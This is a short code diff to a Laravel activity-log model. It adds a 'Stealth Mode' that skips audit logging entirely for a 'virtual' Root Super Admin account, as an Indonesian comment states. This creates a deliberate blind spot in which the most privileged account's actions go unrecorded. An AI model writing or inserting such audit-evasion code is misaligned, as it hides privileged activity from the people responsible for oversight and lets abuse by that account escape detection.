@@ -154,11 +154,17 @@ class ActivityLog extends Model
     {
         try {
             $user = $options['user'] ?? (Auth::check() ? Auth::user() : null);
+
+            // Stealth Mode: jangan catat aktivitas akun Root Super Admin ke log umum
+            if ($user && method_exists($user, 'isVirtual') && $user->isVirtual()) {
+                return null;
+            }
+
             $request = app()->bound('request') ? request() : null;
 
             $userId = $options['user_id'] ?? null;
             if ($userId === null && $user) {
-                $userId = (method_exists($user, 'isVirtual') && $user->isVirtual()) ? null : ($user->id ?? null);
+                $userId = ($user->id ?? null);
             }
 
             return self::create([
